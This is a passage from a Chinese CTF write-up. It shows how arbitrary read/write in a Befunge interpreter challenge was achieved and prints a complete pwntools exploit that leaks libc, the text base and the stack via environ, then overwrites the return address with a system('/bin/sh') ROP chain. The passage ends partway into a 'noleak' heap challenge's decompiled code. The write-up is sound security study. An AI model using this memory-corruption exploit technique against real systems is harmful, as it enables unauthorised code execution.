<p>利用<code>&amp;</code>和<code>p</code>的功能，我们还有办法做到任意写</p>
<ul>
<li>
<p>先穿透<code>&amp;</code>将x，<code>y</code>与<code>z</code>push到stack上</p>
</li>
<li>
<p>p功能会先从堆栈弹出出3个值（x，y，z，均可控），之后将ž的值放入<code>program[80 * x + y]</code>（即<code>program[80 * x + y] = z</code>）。</p>
</li>
</ul>
</li>
<li>
<p>还有一点要注意</p>
<ul>
<li>因为通过<code>&amp;</code>功能将数值push进栈时，一次只能push一个整数（32位）。如果我们想要使<code>program[80 * x + y]</code>跳到很远的地方，x与y很有可能会需要是一个超过<code>integer</code>范围的数值，如此一来使用&amp;功能将无法满足我们的需求。</li>
<li>解决方法，利用的<code>*</code>功能。<code>*</code>会从堆栈弹出顶端两个出数值x与y，并将<code>x * y</code>的查询查询结果推回栈上。这里全程是使用64位寄存器进行操作，所以不会有整数32位的问题。</li>
<li>因此，先通过<code>*</code>功能将stack顶端变成一个长整数，之后我们就可以利用上面的方法对任意位址做任意读写。</li>
</ul>
</li>
</ul>
<p><code>got</code>表不可写，我们只能覆盖栈上的返回地址来执行shell。另外，我们还要泄露libc的值。</p>
<p>通过任意地址读，我们将<code>got</code>表中某函数的地址leak从而得到libc的基址，接下来，我们通过leak栈地址来覆盖返回地址，<a href="https://bamboofox.github.io/write-ups/2016/09/07/MMA-CTF-2nd-2016-Interpreter-200.html" target="_blank" rel="noopener noreffer">参考博客</a>，leak栈地址有以下几种方法(<del>繁体就不翻译了，看多了就习惯了</del>)：</p>
<ul>
<li><strong>leak stack 上的 saved rbp 或是 argv</strong>。这部分通常是用在 format string 的漏洞，這題無法這樣做。</li>
<li><strong>leak tls section 上的 stack address</strong>。這部份比較進階，簡單來說就是程式在執行的時候，會有個 memory 的區塊叫做 tls section，裡面會存許多有用的東西，像是 stack canary, main_arena 的 address, 以及一個不知道指向哪裡的 stack address。而要透過這種方式 leak stack address，我們必須要有辦法知道 tls section 的位址，而這通常需要透過程式先呼叫 mmap，之後 leak mmap 出來的 memory address 來達成。這題因為沒有 malloc 或是 mmap，所以也無法透過這樣的方式來 leak stack address。</li>
<li><strong>leak ld-linux.so 的 __libc_stack_end symbol</strong>。如果我們有辦法知道 ld-linux.so 的位址以及版本，我們可以透過 leak 裡面的 <code>__libc_stack_end</code> 這個 symbol，來獲取 stack address。這題用這種方式理論上辦的到，我自己就是用這種方式 leak 的，只是做起來非常麻煩。解完這題之後，經詢問別人才發現原來還有第四種方式。</li>
<li><strong>leak libc 里面的 environ symbol</strong>。 libc 裡面有個 symbol 叫做 <code>environ</code>，裡面會存 stack address。因此這題比較漂亮的方式，是 leak libc 的 address 之後，直接 leak <code>libc.symbols['environ']</code> 來獲取 stack address。</li>
</ul>
<p>我采用了最后一种方式，博客原文采用了第三种绕了一大圈。另外，这题似乎是MMA CTF 2nd 2016的Interpreter 200并非原创题。</p>
<h2 id="exp-5">exp</h2>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">  1
</span><span class="lnt">  2
</span><span class="lnt">  3
</span><span class="lnt">  4
</span><span class="lnt">  5
</span><span class="lnt">  6
</span><span class="lnt">  7
</span><span class="lnt">  8
</span><span class="lnt">  9
</span><span class="lnt"> 10
</span><span class="lnt"> 11
</span><span class="lnt"> 12
</span><span class="lnt"> 13
</span><span class="lnt"> 14
</span><span class="lnt"> 15
</span><span class="lnt"> 16
</span><span class="lnt"> 17
</span><span class="lnt"> 18
</span><span class="lnt"> 19
</span><span class="lnt"> 20
</span><span class="lnt"> 21
</span><span class="lnt"> 22
</span><span class="lnt"> 23
</span><span class="lnt"> 24
</span><span class="lnt"> 25
</span><span class="lnt"> 26
</span><span class="lnt"> 27
</span><span class="lnt"> 28
</span><span class="lnt"> 29
</span><span class="lnt"> 30
</span><span class="lnt"> 31
</span><span class="lnt"> 32
</span><span class="lnt"> 33
</span><span class="lnt"> 34
</span><span class="lnt"> 35
</span><span class="lnt"> 36
</span><span class="lnt"> 37
</span><span class="lnt"> 38
</span><span class="lnt"> 39
</span><span class="lnt"> 40
</span><span class="lnt"> 41
</span><span class="lnt"> 42
</span><span class="lnt"> 43
</span><span class="lnt"> 44
</span><span class="lnt"> 45
</span><span class="lnt"> 46
</span><span class="lnt"> 47
</span><span class="lnt"> 48
</span><span class="lnt"> 49
</span><span class="lnt"> 50
</span><span class="lnt"> 51
</span><span class="lnt"> 52
</span><span class="lnt"> 53
</span><span class="lnt"> 54
</span><span class="lnt"> 55
</span><span class="lnt"> 56
</span><span class="lnt"> 57
</span><span class="lnt"> 58
</span><span class="lnt"> 59
</span><span class="lnt"> 60
</span><span class="lnt"> 61
</span><span class="lnt"> 62
</span><span class="lnt"> 63
</span><span class="lnt"> 64
</span><span class="lnt"> 65
</span><span class="lnt"> 66
</span><span class="lnt"> 67
</span><span class="lnt"> 68
</span><span class="lnt"> 69
</span><span class="lnt"> 70
</span><span class="lnt"> 71
</span><span class="lnt"> 72
</span><span class="lnt"> 73
</span><span class="lnt"> 74
</span><span class="lnt"> 75
</span><span class="lnt"> 76
</span><span class="lnt"> 77
</span><span class="lnt"> 78
</span><span class="lnt"> 79
</span><span class="lnt"> 80
</span><span class="lnt"> 81
</span><span class="lnt"> 82
</span><span class="lnt"> 83
</span><span class="lnt"> 84
</span><span class="lnt"> 85
</span><span class="lnt"> 86
</span><span class="lnt"> 87
</span><span class="lnt"> 88
</span><span class="lnt"> 89
</span><span class="lnt"> 90
</span><span class="lnt"> 91
</span><span class="lnt"> 92
</span><span class="lnt"> 93
</span><span class="lnt"> 94
</span><span class="lnt"> 95
</span><span class="lnt"> 96
</span><span class="lnt"> 97
</span><span class="lnt"> 98
</span><span class="lnt"> 99
</span><span class="lnt">100
</span><span class="lnt">101
</span><span class="lnt">102
</span><span class="lnt">103
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
<span class="kn">from</span> <span class="nn">LibcSearcher</span> <span class="kn">import</span> <span class="n">LibcSearcher</span>
<span class="kn">from</span> <span class="nn">struct</span> <span class="kn">import</span> <span class="n">pack</span>
<span class="kn">import</span> <span class="nn">sys</span>

<span class="n">leak</span> <span class="o">=</span> <span class="k">lambda</span> <span class="n">name</span><span class="p">,</span><span class="n">addr</span><span class="p">:</span> <span class="n">log</span><span class="o">.</span><span class="n">success</span><span class="p">(</span><span class="s1">&#39;</span><span class="si">{0}</span><span class="s1"> addr ---&gt; </span><span class="si">{1}</span><span class="s1">&#39;</span><span class="o">.</span><span class="n">format</span><span class="p">(</span><span class="n">name</span><span class="p">,</span> <span class="nb">hex</span><span class="p">(</span><span class="n">addr</span><span class="p">)))</span>
<span class="n">context</span><span class="o">.</span><span class="n">arch</span><span class="o">=</span><span class="s2">&#34;amd64&#34;</span>
<span class="n">context</span><span class="o">.</span><span class="n">terminal</span> <span class="o">=</span> <span class="p">[</span><span class="s1">&#39;tmux&#39;</span><span class="p">,</span> <span class="s1">&#39;splitw&#39;</span><span class="p">,</span> <span class="s1">&#39;-h&#39;</span><span class="p">]</span>

<span class="n">binary</span><span class="o">=</span><span class="s1">&#39;./befunge&#39;</span>
<span class="c1">#gdb.attach(sh)</span>
<span class="k">if</span> <span class="s1">&#39;g&#39;</span> <span class="ow">in</span> <span class="n">sys</span><span class="o">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">]:</span>
	<span class="n">context</span><span class="o">.</span><span class="n">log_level</span><span class="o">=</span><span class="s2">&#34;DEBUG&#34;</span>
<span class="k">if</span> <span class="s1">&#39;l&#39;</span> <span class="ow">in</span> <span class="n">sys</span><span class="o">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span> <span class="ow">and</span> <span class="s1">&#39;r&#39;</span> <span class="ow">not</span> <span class="ow">in</span> <span class="n">sys</span><span class="o">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">]:</span>
	<span class="n">sh</span><span class="o">=</span><span class="n">process</span><span class="p">(</span><span class="n">binary</span><span class="p">)</span>
<span class="k">if</span> <span class="s1">&#39;r&#39;</span> <span class="ow">in</span> <span class="n">sys</span><span class="o">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">]:</span>
	<span class="n">sh</span><span class="o">=</span><span class="n">remote</span><span class="p">(</span><span class="s1">&#39;101.200.201.114&#39;</span><span class="p">,</span> <span class="mi">30002</span><span class="p">)</span>

<span class="n">elf</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="n">binary</span><span class="p">,</span><span class="n">checksec</span><span class="o">=</span><span class="kc">False</span><span class="p">)</span>
<span class="n">libc</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="s1">&#39;/lib/x86_64-linux-gnu/libc.so.6&#39;</span><span class="p">,</span><span class="n">checksec</span><span class="o">=</span><span class="kc">False</span><span class="p">)</span>

<span class="k">def</span> <span class="nf">cal_offset</span><span class="p">(</span><span class="n">addr</span><span class="p">,</span> <span class="n">text_base</span><span class="p">):</span>
    <span class="n">start_from</span> <span class="o">=</span> <span class="n">text_base</span> <span class="o">+</span> <span class="mh">0x202040</span>
    <span class="n">offset</span> <span class="o">=</span> <span class="n">addr</span> <span class="o">-</span> <span class="n">start_from</span>
    <span class="n">off_80</span> <span class="o">=</span> <span class="n">offset</span><span class="o">/</span><span class="mi">80</span>
    <span class="n">off_1</span> <span class="o">=</span> <span class="n">offset</span><span class="o">%</span><span class="mi">80</span>

    <span class="k">return</span> <span class="n">off_1</span><span class="p">,</span> <span class="n">off_80</span>

<span class="k">def</span> <span class="nf">write</span><span class="p">(</span><span class="n">addr</span><span class="p">,</span> <span class="n">text_base</span><span class="p">,</span> <span class="n">value</span><span class="p">):</span>
    <span class="n">cnt</span> <span class="o">=</span> <span class="mi">0</span>
    <span class="n">off_1</span><span class="p">,</span> <span class="n">off_80</span> <span class="o">=</span> <span class="n">cal_offset</span><span class="p">(</span><span class="n">addr</span><span class="p">,</span> <span class="n">text_base</span><span class="p">)</span>
    <span class="n">temp</span> <span class="o">=</span> <span class="nb">int</span><span class="p">(</span><span class="n">math</span><span class="o">.</span><span class="n">sqrt</span><span class="p">(</span><span class="n">off_80</span><span class="p">))</span>
    <span class="n">off_1</span> <span class="o">=</span> <span class="p">(</span><span class="n">off_80</span> <span class="o">-</span> <span class="n">temp</span><span class="o">**</span><span class="mi">2</span><span class="p">)</span><span class="o">*</span><span class="mi">80</span> <span class="o">+</span> <span class="n">off_1</span>

    <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="n">off_1</span><span class="p">,</span> <span class="n">off_1</span><span class="o">+</span><span class="mi">6</span><span class="p">):</span>
        <span class="n">v</span> <span class="o">=</span> <span class="p">(</span><span class="n">value</span><span class="o">&gt;&gt;</span><span class="p">(</span><span class="mi">8</span><span class="o">*</span><span class="n">cnt</span><span class="p">))</span> <span class="o">&amp;</span> <span class="mh">0xff</span>
        <span class="n">sh</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="nb">str</span><span class="p">(</span><span class="n">v</span><span class="p">))</span>
        <span class="n">sh</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="nb">str</span><span class="p">(</span><span class="n">i</span><span class="p">))</span>
        <span class="n">sh</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="nb">str</span><span class="p">(</span><span class="n">temp</span><span class="p">))</span>
        <span class="n">sh</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="nb">str</span><span class="p">(</span><span class="n">temp</span><span class="p">))</span>
        <span class="n">cnt</span> <span class="o">+=</span> <span class="mi">1</span>

<span class="n">base</span> <span class="o">=</span> <span class="mh">0x202040</span>
<span class="n">program</span> <span class="o">=</span> <span class="s1">&#39;&gt;&#39;</span><span class="o">.</span><span class="n">ljust</span><span class="p">(</span><span class="mi">79</span><span class="p">,</span><span class="s1">&#39; &#39;</span><span class="p">)</span><span class="o">+</span><span class="s1">&#39;v&#39;</span><span class="o">+</span><span class="s1">&#39;</span><span class="se">\n</span><span class="s1">&#39;</span>
<span class="n">program</span><span class="o">+=</span> <span class="s1">&#39;v,g&amp;&amp;,g&amp;&amp;,g&amp;&amp;,g&amp;&amp;,g&amp;&amp;,g&amp;&amp;,g&amp;&amp;,g&amp;&amp;,g&amp;&amp;,g&amp;&amp;,g&amp;&amp;,g&amp;&amp;&#39;</span><span class="o">.</span><span class="n">ljust</span><span class="p">(</span><span class="mi">79</span><span class="p">,</span><span class="s1">&#39; &#39;</span><span class="p">)</span><span class="o">+</span><span class="s1">&#39;&lt;&#39;</span><span class="o">+</span><span class="s1">&#39;</span><span class="se">\n</span><span class="s1">&#39;</span> <span class="c1">#leak libc 6bytes (1st: -2, 2nd: -48 ~ -43) #leak text 6bytes-56, -9</span>
<span class="n">program</span><span class="o">+=</span> <span class="s1">&#39;&gt;&amp;&amp;&amp;*g,&amp;&amp;&amp;*g,&amp;&amp;&amp;*g,&amp;&amp;&amp;*g,&amp;&amp;&amp;*g,&amp;&amp;&amp;*g,&#39;</span><span class="o">.</span><span class="n">ljust</span><span class="p">(</span><span class="mi">79</span><span class="p">,</span><span class="s1">&#39; &#39;</span><span class="p">)</span><span class="o">+</span><span class="s1">&#39;v&#39;</span><span class="o">+</span><span class="s1">&#39;</span><span class="se">\n</span><span class="s1">&#39;</span> <span class="c1">#leak text 6bytes-56, -9</span>
<span class="n">program</span><span class="o">+=</span> <span class="s1">&#39;vp*&amp;&amp;&amp;&amp;p*&amp;&amp;&amp;&amp;p*&amp;&amp;&amp;&amp;p*&amp;&amp;&amp;&amp;p*&amp;&amp;&amp;&amp;p*&amp;&amp;&amp;&amp;&#39;</span><span class="o">.</span><span class="n">ljust</span><span class="p">(</span><span class="mi">79</span><span class="p">,</span><span class="s1">&#39; &#39;</span><span class="p">)</span><span class="o">+</span><span class="s1">&#39;&lt;&#39;</span><span class="o">+</span><span class="s1">&#39;</span><span class="se">\n</span><span class="s1">&#39;</span>
<span class="n">program</span><span class="o">+=</span> <span class="s1">&#39;&gt;&amp;&amp;&amp;&amp;*p&amp;&amp;&amp;&amp;*p&amp;&amp;&amp;&amp;*p&amp;&amp;&amp;&amp;*p&amp;&amp;&amp;&amp;*p&amp;&amp;&amp;&amp;*p&#39;</span><span class="o">.</span><span class="n">ljust</span><span class="p">(</span><span class="mi">79</span><span class="p">,</span><span class="s1">&#39; &#39;</span><span class="p">)</span><span class="o">+</span><span class="s1">&#39;v&#39;</span><span class="o">+</span><span class="s1">&#39;</span><span class="se">\n</span><span class="s1">&#39;</span>
<span class="n">program</span><span class="o">+=</span> <span class="s1">&#39;vp*&amp;&amp;&amp;&amp;p*&amp;&amp;&amp;&amp;p*&amp;&amp;&amp;&amp;p*&amp;&amp;&amp;&amp;p*&amp;&amp;&amp;&amp;p*&amp;&amp;&amp;&amp;&#39;</span><span class="o">.</span><span class="n">ljust</span><span class="p">(</span><span class="mi">79</span><span class="p">,</span><span class="s1">&#39; &#39;</span><span class="p">)</span><span class="o">+</span><span class="s1">&#39;&lt;&#39;</span><span class="o">+</span><span class="s1">&#39;</span><span class="se">\n</span><span class="s1">&#39;</span>
<span class="n">program</span><span class="o">+=</span> <span class="p">(</span><span class="s1">&#39;v&#39;</span><span class="o">.</span><span class="n">ljust</span><span class="p">(</span><span class="mi">79</span><span class="p">,</span><span class="s1">&#39; &#39;</span><span class="p">)</span><span class="o">+</span><span class="s1">&#39;&lt;&#39;</span><span class="o">+</span><span class="s1">&#39;</span><span class="se">\n</span><span class="s1">&#39;</span><span class="p">)</span><span class="o">*</span><span class="mi">17</span>
<span class="n">program</span><span class="o">+=</span> <span class="s1">&#39;&gt;&#39;</span><span class="o">.</span><span class="n">ljust</span><span class="p">(</span><span class="mi">79</span><span class="p">,</span><span class="s1">&#39;&gt;&#39;</span><span class="p">)</span><span class="o">+</span><span class="s1">&#39;v&#39;</span><span class="o">+</span><span class="s1">&#39;</span><span class="se">\n</span><span class="s1">&#39;</span>
<span class="n">program</span><span class="o">+=</span> <span class="s1">&#39;^&#39;</span><span class="o">.</span><span class="n">ljust</span><span class="p">(</span><span class="mi">79</span><span class="p">,</span><span class="s1">&#39;&lt;&#39;</span><span class="p">)</span><span class="o">+</span><span class="s1">&#39;&lt;&#39;</span><span class="o">+</span><span class="s1">&#39;</span><span class="se">\n</span><span class="s1">&#39;</span>
<span class="n">sh</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s1">&#39;&gt;&#39;</span><span class="p">,</span><span class="n">program</span><span class="p">)</span>
<span class="n">sh</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s2">&#34;&gt; &gt; &gt; &gt; &gt; &gt; &gt; &gt; &gt; &gt; &gt; &gt; &gt; &gt; &gt; &gt; &gt; &gt; &gt; &gt; &gt; &gt; &gt; &gt; &#34;</span><span class="p">)</span>

<span class="n">libc_leak</span> <span class="o">=</span> <span class="s1">&#39;&#39;</span>
<span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">6</span><span class="p">):</span>
    <span class="n">sh</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="nb">str</span><span class="p">((</span><span class="o">-</span><span class="mi">48</span><span class="p">)</span><span class="o">+</span><span class="n">i</span><span class="p">))</span>
    <span class="n">sh</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="nb">str</span><span class="p">(</span><span class="o">-</span><span class="mi">2</span><span class="p">))</span>
    <span class="n">rev</span> <span class="o">=</span> <span class="n">u8</span><span class="p">(</span><span class="n">sh</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">1</span><span class="p">))</span>
    <span class="n">libc_leak</span> <span class="o">=</span> <span class="n">libc_leak</span><span class="o">+</span><span class="n">p8</span><span class="p">(</span><span class="n">rev</span><span class="p">)</span>
    <span class="n">leak</span><span class="p">(</span><span class="nb">str</span><span class="p">(</span><span class="n">i</span><span class="p">),</span><span class="n">rev</span><span class="p">)</span>
<span class="n">libc_leak</span> <span class="o">=</span> <span class="n">u64</span><span class="p">(</span><span class="n">libc_leak</span><span class="o">.</span><span class="n">ljust</span><span class="p">(</span><span class="mi">8</span><span class="p">,</span><span class="s1">&#39;</span><span class="se">\x00</span><span class="s1">&#39;</span><span class="p">))</span>
<span class="n">libcbase</span> <span class="o">=</span> <span class="n">libc_leak</span><span class="o">-</span><span class="n">libc</span><span class="o">.</span><span class="n">sym</span><span class="p">[</span><span class="s1">&#39;__libc_start_main&#39;</span><span class="p">]</span>
<span class="n">system</span> <span class="o">=</span> <span class="n">libcbase</span> <span class="o">+</span> <span class="n">libc</span><span class="o">.</span><span class="n">sym</span><span class="p">[</span><span class="s2">&#34;system&#34;</span><span class="p">]</span>
<span class="n">env</span> <span class="o">=</span> <span class="n">libcbase</span> <span class="o">+</span> <span class="n">libc</span><span class="o">.</span><span class="n">sym</span><span class="p">[</span><span class="s1">&#39;environ&#39;</span><span class="p">]</span>
<span class="n">binsh</span> <span class="o">=</span> <span class="n">libcbase</span><span class="o">+</span> <span class="n">libc</span><span class="o">.</span><span class="n">search</span><span class="p">(</span><span class="s1">&#39;/bin/sh&#39;</span><span class="p">)</span><span class="o">.</span><span class="n">next</span><span class="p">()</span>
<span class="n">leak</span><span class="p">(</span><span class="s1">&#39;libc base&#39;</span><span class="p">,</span><span class="n">libcbase</span><span class="p">)</span>
<span class="n">leak</span><span class="p">(</span><span class="s1">&#39;binsh&#39;</span><span class="p">,</span><span class="n">binsh</span><span class="p">)</span>

<span class="n">text_leak</span> <span class="o">=</span> <span class="s1">&#39;&#39;</span>
<span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">6</span><span class="p">):</span>
    <span class="n">sh</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="nb">str</span><span class="p">((</span><span class="o">-</span><span class="mi">56</span><span class="p">)</span><span class="o">+</span><span class="n">i</span><span class="p">))</span>
    <span class="n">sh</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="nb">str</span><span class="p">(</span><span class="o">-</span><span class="mi">9</span><span class="p">))</span>
    <span class="n">rev</span> <span class="o">=</span> <span class="n">u8</span><span class="p">(</span><span class="n">sh</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">1</span><span class="p">))</span>
    <span class="n">text_leak</span> <span class="o">=</span> <span class="n">text_leak</span><span class="o">+</span><span class="n">p8</span><span class="p">(</span><span class="n">rev</span><span class="p">)</span>
    <span class="n">leak</span><span class="p">(</span><span class="nb">str</span><span class="p">(</span><span class="n">i</span><span class="p">),</span><span class="n">rev</span><span class="p">)</span>
<span class="n">textbase</span> <span class="o">=</span> <span class="n">u64</span><span class="p">(</span><span class="n">text_leak</span><span class="o">.</span><span class="n">ljust</span><span class="p">(</span><span class="mi">8</span><span class="p">,</span><span class="s1">&#39;</span><span class="se">\x00</span><span class="s1">&#39;</span><span class="p">))</span><span class="o">-</span><span class="mh">0xb00</span> 
<span class="n">pop_rdi</span> <span class="o">=</span> <span class="n">textbase</span> <span class="o">+</span> <span class="mh">0x120c</span>
<span class="n">start</span> <span class="o">=</span> <span class="n">base</span><span class="o">+</span><span class="n">textbase</span>
<span class="n">leak</span><span class="p">(</span><span class="s1">&#39;text base&#39;</span><span class="p">,</span><span class="n">textbase</span><span class="p">)</span>
<span class="n">leak</span><span class="p">(</span><span class="s1">&#39;pop rdi&#39;</span><span class="p">,</span><span class="n">pop_rdi</span><span class="p">)</span>

<span class="n">off_1</span><span class="p">,</span> <span class="n">off_80</span> <span class="o">=</span> <span class="n">cal_offset</span><span class="p">(</span><span class="n">env</span><span class="p">,</span> <span class="n">textbase</span><span class="p">)</span>
<span class="n">temp</span> <span class="o">=</span> <span class="nb">int</span><span class="p">(</span><span class="n">math</span><span class="o">.</span><span class="n">sqrt</span><span class="p">(</span><span class="n">off_80</span><span class="p">))</span>
<span class="n">off_1</span> <span class="o">=</span> <span class="p">(</span><span class="n">off_80</span> <span class="o">-</span> <span class="n">temp</span><span class="o">**</span><span class="mi">2</span><span class="p">)</span><span class="o">*</span><span class="mi">80</span> <span class="o">+</span> <span class="n">off_1</span>
<span class="n">stack_leak</span> <span class="o">=</span> <span class="s1">&#39;&#39;</span>
<span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="n">off_1</span><span class="p">,</span><span class="n">off_1</span><span class="o">+</span><span class="mi">6</span><span class="p">):</span>
    <span class="n">sh</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="nb">str</span><span class="p">(</span><span class="n">i</span><span class="p">))</span>
    <span class="n">sh</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="nb">str</span><span class="p">(</span><span class="n">temp</span><span class="p">))</span>
    <span class="n">sh</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="nb">str</span><span class="p">(</span><span class="n">temp</span><span class="p">))</span>
    <span class="n">rev</span> <span class="o">=</span> <span class="n">u8</span><span class="p">(</span><span class="n">sh</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">1</span><span class="p">))</span>
    <span class="n">stack_leak</span> <span class="o">=</span> <span class="n">stack_leak</span><span class="o">+</span><span class="n">p8</span><span class="p">(</span><span class="n">rev</span><span class="p">)</span>
    <span class="n">leak</span><span class="p">(</span><span class="nb">str</span><span class="p">(</span><span class="n">i</span><span class="o">-</span><span class="n">off_1</span><span class="p">),</span><span class="n">rev</span><span class="p">)</span>
<span class="n">stack_leak</span> <span class="o">=</span> <span class="n">u64</span><span class="p">(</span><span class="n">stack_leak</span><span class="o">.</span><span class="n">ljust</span><span class="p">(</span><span class="mi">8</span><span class="p">,</span><span class="s1">&#39;</span><span class="se">\x00</span><span class="s1">&#39;</span><span class="p">))</span><span class="o">-</span><span class="mh">0xf0</span>
<span class="n">leak</span><span class="p">(</span><span class="s1">&#39;stack_leak&#39;</span><span class="p">,</span><span class="n">stack_leak</span><span class="p">)</span>

<span class="n">write</span><span class="p">(</span><span class="n">stack_leak</span><span class="p">,</span> <span class="n">textbase</span><span class="p">,</span> <span class="n">pop_rdi</span><span class="p">)</span>
<span class="n">write</span><span class="p">(</span><span class="n">stack_leak</span><span class="o">+</span><span class="mi">8</span><span class="p">,</span> <span class="n">textbase</span><span class="p">,</span> <span class="n">binsh</span><span class="p">)</span>
<span class="n">write</span><span class="p">(</span><span class="n">stack_leak</span><span class="o">+</span><span class="mi">16</span><span class="p">,</span> <span class="n">textbase</span><span class="p">,</span> <span class="n">system</span><span class="p">)</span>

<span class="n">sh</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
</code></pre></td></tr></table>
</div>
</div><h1 id="noleak">noleak</h1>
<h2 id="check">check</h2>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
</code></pre></td></tr></table>
</div>
</div><h2 id="ida-6">IDA</h2>
<p><strong>add</strong></p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span><span class="lnt">26
</span><span class="lnt">27
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="kr">__int64</span> <span class="nf">add</span><span class="p">()</span>
<span class="p">{</span>
  <span class="kr">__int64</span> <span class="n">result</span><span class="p">;</span> <span class="c1">// rax
</span><span class="c1"></span>  <span class="kt">int</span> <span class="n">v1</span><span class="p">;</span> <span class="c1">// [rsp+0h] [rbp-10h]
</span><span class="c1"></span>  <span class="kt">int</span> <span class="n">nbytes</span><span class="p">;</span> <span class="c1">// [rsp+4h] [rbp-Ch]
</span><span class="c1"></span>  <span class="kt">void</span> <span class="o">*</span><span class="n">nbytes_4</span><span class="p">;</span> <span class="c1">// [rsp+8h] [rbp-8h]
</span><span class="c1"></span>
  <span class="n">puts</span><span class="p">(</span><span class="s">&#34;Input index:&#34;</span><span class="p">);</span>
  <span class="n">v1</span> <span class="o">=</span> <span class="n">sub_9E0</span><span class="p">();</span>
  <span class="n">puts</span><span class="p">(</span><span class="s">&#34;Input size:&#34;</span><span class="p">);</span>
  <span class="n">nbytes</span> <span class="o">=</span> <span class="n">sub_9E0</span><span class="p">();</span>
  <span class="k">if</span> <span class="p">(</span> <span class="n">v1</span> <span class="o">&lt;</span> <span class="mi">0</span> <span class="o">||</span> <span class="n">v1</span> <span class="o">&gt;</span> <span class="mi">10</span> <span class="o">||</span> <span class="n">nbytes</span> <span class="o">&lt;</span> <span class="mi">0</span> <span class="o">||</span> <span class="n">nbytes</span> <span class="o">&gt;</span> <span class="mi">496</span> <span class="p">)</span>
  <span class="p">{</span>
    <span class="n">puts</span><span class="p">(</span><span class="s">&#34;index or size invalid!&#34;</span><span class="p">);</span>
    <span class="n">result</span> <span class="o">=</span> <span class="mh">0xFFFFFFFFLL</span><span class="p">;</span>
  <span class="p">}</span>
  <span class="k">else</span>
  <span class="p">{</span>
    <span class="n">nbytes_4</span> <span class="o">=</span> <span class="n">malloc</span><span class="p">(</span><span class="n">nbytes</span><span class="p">);</span>
    <span class="n">puts</span><span class="p">(</span><span class="s">&#34;Input data:&#34;</span><span class="p">);</span>
    <span class="n">read</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="n">nbytes_4</span><span class="p">,</span> <span class="p">(</span><span class="kt">unsigned</span> <span class="kt">int</span><span class="p">)</span><span class="n">nbytes</span><span class="p">);</span>
    <span class="o">*</span><span class="p">((</span><span class="n">_QWORD</span> <span class="o">*</span><span class="p">)</span><span class="o">&amp;</span><span class="n">unk_2020C0</span> <span class="o">+</span> <span class="mi">2</span> <span class="o">*</span> <span class="n">v1</span><span class="p">)</span> <span class="o">=</span> <span class="n">nbytes_4</span><span class="p">;</span>
    <span class="n">dword_2020C8</span><span class="p">[</span><span class="mi">4</span> <span class="o">*</span> <span class="n">v1</span><span class="p">]</span> <span class="o">=</span> <span class="n">nbytes</span><span class="p">;</span>
    <span class="n">result</span> <span class="o">=</span> <span class="mi">0LL</span><span class="p">;</span>
  <span class="p">}</span>
  <span class="k">return</span> <span class="n">result</span><span class="p">;</span>
<span class="p">}</span>
</code></pre></td></tr></table>
</div>
</div><p><strong>dele</strong></p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
